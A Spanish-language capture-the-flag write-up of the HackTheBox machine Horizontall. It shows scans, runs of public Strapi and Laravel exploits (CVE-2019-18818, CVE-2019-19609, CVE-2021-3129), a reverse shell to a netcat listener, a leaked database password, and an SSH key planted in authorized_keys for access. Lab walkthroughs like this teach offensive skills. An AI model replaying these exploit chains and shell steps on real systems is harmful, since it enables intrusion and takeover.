---
layout: post
title: Horizontall - WriteUp
author: WildZarek
permalink: /htb/horizontall
excerpt: "Una máquina Linux muy facilita, donde lo más interesante es el Port-Forwarding. Nos aprovechamos de varias vulnerabilidades tirando de exploits existentes con sus respectivos CVE's. Muy recomendable para aprender si estás empezando en la plataforma y tienes pocas máquinas realizadas."
description: "Una máquina Linux muy facilita, donde lo más interesante es el Port-Forwarding. Nos aprovechamos de varias vulnerabilidades tirando de exploits existentes con sus respectivos CVE's. Muy recomendable para aprender si estás empezando en la plataforma y tienes pocas máquinas realizadas."
date: 2022-02-05
header:
  teaser: /assets/images/hackthebox/machines/horizontall.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, Web Exploiting, Port Forwarding, Privilege Escalation]
tags: [API, CVE, JWT, RCE]
---

<p align="center"><img src="/assets/images/hackthebox/machines/horizontall.png"></p>

## Fecha de Resolución

<p align="center"><a href="https://www.hackthebox.com/achievement/machine/18979/374"><img src="/assets/images/hackthebox/machines/horizontall/pwned_date.png"></a></p>

En primer lugar y como en cualquier máquina, necesitamos información sobre la misma así que vamos a hacer un reconocimiento para identificar los posibles vectores de entrada.

## Fase de Reconocimiento

Empezamos el reconocimiento lanzando un **`TCP SYN Port Scan`** con **`Nmap`** para ver qué puertos abiertos tiene la máquina.

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS       | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo      |
| --open    | Mostrar sólo los puertos que esten abiertos              |
| -vvv      | Triple verbose para ver en consola los resultados        |
| -n        | No efectuar resolución DNS                               |
| -Pn       | No efectuar descubrimiento de hosts                      |
| -oG       | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.105 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-19 18:22 CET
Initiating SYN Stealth Scan at 18:22
Scanning 10.10.11.105 [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 18:24 (0:00:55 remaining)
Discovered open port 22/tcp on 10.10.11.105
Discovered open port 80/tcp on 10.10.11.105
Completed SYN Stealth Scan at 18:24, 132.26s elapsed (65535 total ports)
Nmap scan report for 10.10.11.105
Host is up, received user-set (0.19s latency).
Scanned at 2021-12-19 18:22:22 CET for 132s
Not shown: 53018 filtered tcp ports (no-response), 12515 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 132.53 seconds
           Raw packets sent: 124817 (5.492MB) | Rcvd: 12519 (500.776KB)
```

Identificamos dos puertos abiertos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** - SSH o Secure Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor web |

Vamos a realizar un escaneo específico de los puertos encontrados para obtener más información de los servicios que se ejecutan.

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p 22,80 10.10.11.105 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-19 18:30 CET
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
```

Veamos con qué está construida la página web, para ello ejecutamos la herramienta **`whatweb`** no sin antes añadir el virtualhost a nuestro archivo **`/etc/hosts`**

```console
p3ntest1ng:~$ echo '10.10.11.105 horizontall.htb' | sudo tee -a /etc/hosts
```

```console
p3ntest1ng:~$ whatweb http://horizontall.htb/

http://horizontall.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
```

Desafortunadamente esto no nos revela ninguna información de utilidad así que vamos a fuzzear la web para descubrir directorios.
Primero usando un diccionario pequeño y si no encontramos nada usaremos uno más grande.

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Muestra el output en formato colorizado |
| -w        | Utiliza el diccionario especificado |
| --hc 404  | Oculta todos los códigos de estado 404 |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://horizontall.htb/FUZZ 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1 L      43 W       901 Ch      http://horizontall.htb/
000001114:   301        7 L      13 W       194 Ch      css
000001575:   200        0 L      38 W       4248 Ch     favicon.ico
000001998:   301        7 L      13 W       194 Ch      img
000002020:   200        1 L      43 W       901 Ch      index.html
000002179:   301        7 L      13 W       194 Ch      js

Total time: 0
Processed Requests: 4614
Filtered Requests: 4608
Requests/sec.: 0
```

Tampoco conseguimos ninguna información relevante con esto, vamos a comprobar si existen subdominios.

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Mostrar el output en formato colorizado |
| -w        | Utiliza el diccionario especificado |
| --hc 301,404 | Oculta los códigos de estado 301 y 404 |
| -H        | Realiza una consulta de tipo header |
| -u        | Especifica la URL para la consulta |
| -t        | Nos permite lanzar el comando con N threads |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 301,404 -H "Host: FUZZ.horizontall.htb" -u http://horizontall.htb -t 100 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1 L      43 W       901 Ch      www
000047093:   200        19 L     33 W       413 Ch      api-prod

Total time: 353.0028
Processed Requests: 114441
Filtered Requests: 114439
Requests/sec.: 324.1928
```

Hemos dado con un subdominio interesante, así que vamos a añadirlo a nuestro **`/etc/hosts`** para poder verlo.

```console
p3ntest1ng:~$ echo '10.10.11.105 api-prod.horizontall.htb' | sudo tee -a /etc/hosts
```

## Fase de Explotación

Echemos un vistazo a este subdominio:

![api-prod](/assets/images/hackthebox/machines/horizontall/api-prod1.png)

Vemos un mensaje de bienvenida y ninguna información adicional así que probamos a añadirle **`/admin`** como subdirectorio.

![api-prod](/assets/images/hackthebox/machines/horizontall/api-prod2.png)

Tenemos un panel de acceso para administradores de la API gestionado por **`strapi`**, comprobemos qué versión se está utilizando.

![Strapi Version](/assets/images/hackthebox/machines/horizontall/strapi_version.png)

Realizando una búsqueda rápida en Google encontramos que esta versión es vulnerable a [Remote Code Execution (RCE)](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html)

![Strapi Vulnerability](/assets/images/hackthebox/machines/horizontall/strapi_vuln.png)

Nos descargamos el [exploit](https://www.exploit-db.com/exploits/50239) y lo ejecutamos siguiendo las intrucciones:

```console
p3ntest1ng:~$ python3 exploit-CVE-2019-18818.py http://api-prod.horizontall.htb/
```

![Strapi Exploited](/assets/images/hackthebox/machines/horizontall/strapi_exploit.png)

Ahora que tenemos acceso como administrador, vamos a iniciar sesión y ver qué nos encontramos.

![Strapi Admin](/assets/images/hackthebox/machines/horizontall/strapi_admin.png)

De nuevo buscando por Google acerca de esta vulnerabilidad en Strapi, averiguamos que es posible obtener una shell inversa.
Para ello necesitamos el token **`JWT`** pero afortunadamente el exploit anterior ya nos proporcionó dicho token.
Vamos a utilizar [otro exploit](https://github.com/diego-tella/CVE-2019-19609-EXPLOIT) para obtener la shell, pero primero nos ponemos en escucha con **`nc -nlvp 9999`**

```console
p3ntest1ng:~$ python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM5OTQ2MDQwLCJleHAiOjE2NDI1MzgwNDB9.Mqaypv9YCdphfV10JvjPU_9mfw7jI_YYgL5hAAOIRL8 -l 10.10.14.253 -p 9999
```

![Strapi Shell](/assets/images/hackthebox/machines/horizontall/got_shell.png)

> NOTA: Disculpas por la calidad de la imagen. En la imagen se ven otros nombres porque yo cambié los nombres a los exploits por comodidad.

Ejecutamos **`whoami`** para ver qué usuario somos en el sistema, luego nos movemos hasta **`/home/developer/`** y tenemos la flag de usuario en **`user.txt`**

![User Flag](/assets/images/hackthebox/machines/horizontall/flag_user.png)

Investigando un poco por los directorios del sistema, descubro un archivo **`database.json`**:

```console
$ cat /myapi/config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

Son las credenciales para el servicio **`MySQL`** del usuario **`developer`**, sin embargo analizando la base de datos no encontré nada de utilidad.

## Escalada de Privilegios

Nos queda obtener acceso privilegiado como root y conseguir la flag. Veamos cómo conseguirlo.
Lo primero que yo siempre hago es listar los permisos del usuario a nivel de sudo, si los hubiera.

```console
$ sudo -l
```

Pero nos pide contraseña y no la conocemos, comprobemos si existen SUID.

```console
$ find \-perm -4000 2>/dev/null
```

No parece haber nada, tampoco hay suerte buscando GUID. Sólo se me ocurre buscar puertos locales que no hayamos podido ver con Nmap.

Para ello ejecutamos **`netstat -tulpn | grep LISTEN`** para ver qué puertos tenemos abiertos en la máquina.
Vemos que está el puerto **8000** abierto pero no es accesible desde el exterior, necesitamos hacer [Port-Forwarding](https://es.wikipedia.org/wiki/Redirecci%C3%B3n_de_puertos)
Nos situamos bajo el directorio **`/opt/strapi`** y ejecutamos el comando **`ssh-keygen`**

```console
$ pwd
/opt/strapi
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/opt/strapi/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Created directory '/opt/strapi/.ssh'.
Your identification has been saved in /opt/strapi/.ssh/id_rsa.
Your public key has been saved in /opt/strapi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:RswPtKQH8PrRY1gPOvPjercbt41hmBAhoyLtFrayO3Y strapi@horizontall
The key's randomart image is:
+---[RSA 2048]----+
|    ..+ +        |
| .   o X o       |
|. = . o @        |
| + + . B *       |
|. + . * S o      |
| +   . B o o     |
|.     . o + +    |
|.o E   ....+ =   |
|o..   .o..ooo .  |
+----[SHA256]-----+
$ 
```

Ahora nos colocamos bajo el directorio **`.ssh`** y creamos un archivo con **`touch authorized_keys`** y pegamos la clave pública que hemos generado.
En nuestra máquina local creamos un par de claves de igual modo con **`ssh-keygen`**,
copiamos nuestra clave pública y la pegamos dentro del archivo **`authorized_keys`** de la máquina Horizontall, de modo que debe contener dos claves, la suya propia y la nuestra.

```console
$ cd .ssh
$ ls
id_rsa
id_rsa.pub
$ touch authorized_keys
$ cat id_rsa.pub > authorized_keys
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCyL7ekPUOothGSU6kZyM1Hlmaz9ZUrPhiflcr5A0WMcnkCk9/ssRRvIqYAKVtzVrqckY8H8wA8iqLNLfdWyTP2VFOdwKRjWJdbQIQsp1bcik33WPVwQX6jNUACJwWrUq53LZ2j7q2mRN9z1Aij4w9bt6VxdjtgbbO3lY1CM0uA+eqEcXmIe0S5pbBMJECtQKZcorXzVZj9X8cnEd5LMbxKTZJK0JBao1menfBEbQ1BAjpxm4UM1hMi2AkocXRqEAkMVys+QXBrnlQcHNk6OowYsc8KXohJecLOLq7xGJ70C3W0MkxGrOzlyvIOA3ye62ERLvXKQHq6z3pzZi9UM8NegAM8h9SYridPmAiHk2fmJ9+lMONMWp2vZMyk549EzxWIgvtVYZ61II4u9Iu54sLzvmv0++ssgiWq0GtrUBxelxsAd882WqxAPwgvn+td6C6IcW40r5hwNQg14MLbMfyyIC5KNuAWpHYpr6sG9bitL5p1YLPRIjrM4ezmr4clbnHOjsG8Q2X6GRsPCCkTWPivZjHxrxCdYPDdk92oTFLHr2lF72EMd6lkRvIgn3kv7W822qjdciJIVSO7UooWizVE5u2BGTr+Q79WVbi4PFbwA1BE1/qp/Q5ZfbDBhyHvYK3v9uTof1gf1Od+KKnMggeHzYBTudY3D4xQcWXpfxWqpQ== wildzarek@p3ntest1ng.htb" >> authorized_keys
$ 
```

Ya estamos listos para iniciar nuestro [Port-Forwarding](https://es.wikipedia.org/wiki/Redirecci%C3%B3n_de_puertos). Básicamente nuestro puerto **8000** estará redirigido al puerto **8000** de la máquina Horizontall.
De ese modo podemos navegar a nuestro localhost y ver qué se está ejecutando en este puerto.

```console
p3ntest1ng:~$ ssh -i wildzarek -L 8000:127.0.0.1:8000 strapi@horizontall.htb

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 19 23:49:40 UTC 2021

  System load:  0.0               Processes:           203
  Usage of /:   84.2% of 4.85GB   Users logged in:     0
  Memory usage: 36%               IP address for eth0: 10.10.11.105
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
$ 
```

Abrimos en el navegador la URL **`http://localhost:8000/`** y vemos un panel Laravel vulnerable a [Remote Code Execution (RCE)](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html) bajo la vulnerabilidad **`CVE-2021-3129`**

![Laravel Panel](/assets/images/hackthebox/machines/horizontall/laravel_panel.png)

Por suerte encontrar el exploit es bastante sencillo así que lo descargamos y lo ejecutamos.

```console
p3ntest1ng:~$ git clone https://github.com/nth347/CVE-2021-3129_exploit
p3ntest1ng:~$ cd CVE-2021-3129_exploit
p3ntest1ng:~$ chmod +x exploit.py
```

```console
p3ntest1ng:~$ python exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"

[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

d67c70287b99234284ae58a7b65aa301

[i] Trying to clear logs
[+] Logs cleared
```

Si queremos obtener acceso mediante shell, podemos repetir el proceso para leer las claves id_rsa del directorio .ssh,
las copiamos a nuestra máquina, le otorgamos los permisos adecuados y nos conectamos mediante SSH.

### ¡Gracias por leer hasta el final!

Y eso ha sido todo. Una máquina bastante asequible y fácil de realizar, quitando el redireccionamiento de puertos,
lo demás ha sido enumeración y tirar de CVE's ya existentes. Recomendable si estás empezando en la plataforma y tienes pocas máquinas hechas.

#### Nos vemos en un próximo. ¡Feliz hacking! ☠